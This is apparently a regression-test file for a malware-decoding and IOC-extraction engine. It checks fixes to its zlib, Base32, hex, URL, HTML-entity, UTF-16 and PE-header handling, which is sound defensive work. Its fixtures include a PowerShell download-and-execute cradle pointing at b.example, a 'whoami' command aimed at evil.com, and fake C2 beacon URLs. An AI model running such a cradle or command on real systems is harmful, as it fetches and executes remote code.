"""Regression tests for engine review fixes.

Covers:
- config-enabled off-by-default decoders are actually registered
- smart-detection decoder enablement resets between run_analysis() calls
- timeout_context degrades gracefully off the main thread (Windows/worker
  threads), instead of crashing and silently disabling every decoder
- ZlibDecoder validates the full RFC 1950 header (FCHECK), not just the
  low nibble of the first byte
- Base32Decoder accepts all valid unpadded lengths (mod 8 in {0,2,4,5,7})
- looks_like_hex rejects int()-isms unhexlify can't decode ("0x", "+", "_")
- PE machine 0x01C4 is ARMNT (ARM Thumb-2), not ARM64
"""

import base64
import binascii
import random
import re
import struct
import threading
import zlib

from titan_decoder.config import Config
from titan_decoder.core.engine import TitanEngine
from titan_decoder.decoders.base import Base32Decoder, ZlibDecoder
from titan_decoder.utils.helpers import looks_like_hex


def _uu_sample(payload: bytes) -> bytes:
    return b"begin 644 t.bin\n" + binascii.b2a_uu(payload) + b"`\nend\n"


def test_config_enabled_optional_decoder_is_registered():
    cfg = Config()
    cfg._config["decoders"]["uuencode"] = True
    eng = TitanEngine(cfg)
    assert eng.uuencoder.enabled
    assert eng.uuencoder in eng.decoders


def test_smart_detection_state_resets_between_runs():
    eng = TitanEngine(Config())
    assert not eng.uuencoder.enabled

    # First run trips smart detection and enables the UU decoder mid-run.
    rep = eng.run_analysis(_uu_sample(b"beacon http://uu.example/c2 padding"))
    assert any("uu.example" in u for u in rep["iocs"]["urls"])

    # A later, unrelated run must start from the configured baseline again.
    eng.run_analysis(b"plain text, nothing encoded here at all")
    assert not eng.uuencoder.enabled
    assert eng.uuencoder not in eng.decoders

    # And smart detection still re-enables it when needed.
    rep = eng.run_analysis(_uu_sample(b"second http://uu2.example/c2 padding"))
    assert any("uu2.example" in u for u in rep["iocs"]["urls"])


def test_engine_decodes_from_worker_thread():
    # SIGALRM-based timeouts are unavailable off the main thread; the engine
    # must fall back to unguarded execution rather than (silently) failing
    # every decoder call.
    result = {}

    def worker():
        eng = TitanEngine(Config())
        data = base64.b64encode(b"beacon http://thread.example/c2 and padding")
        result["report"] = eng.run_analysis(data)

    t = threading.Thread(target=worker)
    t.start()
    t.join()
    assert any("thread.example" in u for u in result["report"]["iocs"]["urls"])


def test_zlib_header_validation():
    dec = ZlibDecoder()
    # Real zlib streams at every compression level are accepted.
    for level in range(10):
        assert dec.can_decode(zlib.compress(b"payload " * 32, level))
    # Deflate nibble but invalid FCHECK / CINFO are rejected.
    assert not dec.can_decode(b"\x78\x00rest")  # 0x7800 % 31 != 0
    assert not dec.can_decode(b"\x88\x0cxxxx")  # CINFO > 7
    # False-positive rate on random data should be ~1/496, not ~6%.
    rng = random.Random(1337)
    hits = sum(
        1
        for _ in range(20000)
        if dec.can_decode(bytes([rng.randrange(256), rng.randrange(256)]) + b"xx")
    )
    assert hits < 100


def test_base32_accepts_all_valid_unpadded_lengths():
    dec = Base32Decoder(enabled=True)
    # 11..15 input bytes produce unpadded lengths of 18,20,21,23,24
    # (mod 8 = 2,4,5,7,0); all are valid and must decode round-trip.
    for n in (11, 12, 13, 14, 15):
        payload = bytes(range(n))
        enc = base64.b32encode(payload).rstrip(b"=")
        assert dec.can_decode(enc), (n, len(enc) % 8)
        out, ok = dec.decode(enc)
        assert ok and out == payload
    # Impossible unpadded lengths stay rejected.
    assert not dec.can_decode(b"A" * 17)  # mod 8 == 1
    assert not dec.can_decode(b"A" * 19)  # mod 8 == 3


def test_looks_like_hex_is_strict():
    assert looks_like_hex(b"1f2a3b4c")
    assert looks_like_hex(b"  DEADBEEF  ")
    assert not looks_like_hex(b"0x1f2a3b4c")  # int(,16) accepted this
    assert not looks_like_hex(b"1f_2a3b4c5d")  # underscore separators
    assert not looks_like_hex(b"+1f2a3b4c5d")  # sign prefix
    assert not looks_like_hex(b"")


def test_pe_armnt_machine_not_mislabeled_arm64():
    from titan_decoder.core.analyzers.base import PEAnalyzer

    # Minimal PE: DOS header with e_lfanew=64, then "PE\0\0" + COFF header
    # with machine 0x01C4 (ARMNT / ARM Thumb-2).
    data = bytearray(200)
    data[0:2] = b"MZ"
    data[60:64] = struct.pack("<I", 64)
    data[64:68] = b"PE\x00\x00"
    data[68:88] = struct.pack("<HHIIIHH", 0x01C4, 1, 0, 0, 0, 0, 0)

    analyzer = PEAnalyzer()
    assert analyzer.can_analyze(bytes(data))
    ((_, meta_json),) = analyzer.analyze(bytes(data))
    assert b'"ARM Thumb-2"' in meta_json
    assert b"ARM64" not in meta_json


def test_text_transform_decoders_do_not_fire_on_binary():
    # URL/HTML-entity/unicode-escape decoders used errors="ignore", which on
    # binary input silently deleted every non-UTF-8 byte; the mangled output
    # differed from the input, so the "decode" was reported successful and its
    # apparent entropy reduction outscored the correct decoder (e.g. Gzip),
    # killing the real decode chain. They must only fire on valid UTF-8 text.
    from titan_decoder.decoders.base import (
        HTMLEntityDecoder,
        UnicodeEscapeDecoder,
        URLDecoder,
    )

    binary = bytes(range(256)) + b" %41 + &amp; \\u0041 "
    for dec in (URLDecoder(), HTMLEntityDecoder(), UnicodeEscapeDecoder()):
        assert not dec.can_decode(binary), dec.name
        out, ok = dec.decode(binary)
        assert not ok and out == binary, dec.name
    # Genuine text payloads still decode.
    out, ok = URLDecoder().decode(b"http%3A%2F%2Fexample.com%2Fx")
    assert ok and out == b"http://example.com/x"
    out, ok = HTMLEntityDecoder().decode(b"a &amp; b &#65;")
    assert ok and out == b"a & b A"
    out, ok = UnicodeEscapeDecoder().decode(b"\\u0068\\u0069 there")
    assert ok and out == b"hi there"


def test_html_entity_surrogate_does_not_void_decode():
    # A numeric entity in the UTF-16 surrogate range (&#55296; = U+D800)
    # produced a lone surrogate that chr() accepts but UTF-8 cannot encode;
    # the blanket except then failed the whole decode, so one crafted entity
    # disabled entity decoding for the entire payload. Surrogate entities must
    # stay literal while the surrounding entities still decode.
    from titan_decoder.decoders.base import HTMLEntityDecoder

    dec = HTMLEntityDecoder()
    out, ok = dec.decode(b"&#55296; ping &amp; &#x41; &#xDFFF;")
    assert ok
    assert out == b"&#55296; ping & A &#xDFFF;"


def test_url_decoder_plus_only_in_form_context():
    # '+' is a space only in form-encoded contexts (a URL's query component or
    # a bare k=v&k=v body). Converting it everywhere corrupted literal '+' --
    # notably base64 embedded in percent-encoded payloads, where each converted
    # '+' broke the next decode layer.
    from titan_decoder.decoders.base import URLDecoder

    dec = URLDecoder()
    # '+' in the path stays literal; '+' in the query becomes a space.
    out, ok = dec.decode(b"http://x/a+b/c%2Ed?q=hello+world&r=1")
    assert ok and out == b"http://x/a+b/c.d?q=hello world&r=1"
    # Percent-encoded base64: '+' must survive for the next decode layer.
    out, ok = dec.decode(b"c2VjcmV0K3BhcnQ%3D")
    assert ok and out == b"c2VjcmV0K3BhcnQ="
    # Bare form-encoded body: '+' is a space.
    out, ok = dec.decode(b"cmd=whoami+/all&dst=evil%2Ecom")
    assert ok and out == b"cmd=whoami /all&dst=evil.com"


def test_gzip_stream_with_percent_bytes_not_hijacked():
    import gzip as _gzip
    import json as _json

    # Find a payload whose *compressed* bytes contain a %XX trigram, i.e. the
    # exact situation where URLDecoder previously outscored Gzip and broke the
    # chain (observed nondeterministically in the stress scenario runner).
    for i in range(20000):
        inner = _json.dumps(
            {"c2": "https://stress.example/v2/checkin", "nonce": i}
        ).encode()
        blob = _gzip.compress(inner)
        if re.search(rb"%[0-9A-Fa-f]{2}", blob):
            break
    else:  # pragma: no cover - search space makes this effectively impossible
        raise AssertionError("could not construct trigger payload")

    eng = TitanEngine(Config())
    rep = eng.run_analysis(base64.b64encode(blob))
    assert any("stress.example" in u for u in rep["iocs"]["urls"]), rep["iocs"]


def test_utf16_decoder_strips_bom():
    # Explicit-endian codecs don't consume a leading BOM: it decoded to U+FEFF
    # and re-encoded as \xef\xbb\xbf at the front of the UTF-8 output,
    # corrupting the artifact and its hash. PowerShell routinely emits
    # BOM-prefixed UTF-16, so both endians must round-trip cleanly.
    from titan_decoder.decoders.base import Utf16Decoder

    text = "IEX (New-Object Net.WebClient).DownloadString('http://b.example/x')"
    for encoding, bom in (("utf-16-le", b"\xff\xfe"), ("utf-16-be", b"\xfe\xff")):
        for prefix in (b"", bom):
            data = prefix + text.encode(encoding)
            out, ok = Utf16Decoder().decode(data)
            assert ok, (encoding, bool(prefix))
            assert out == text.encode("utf-8"), (encoding, bool(prefix), out[:8])
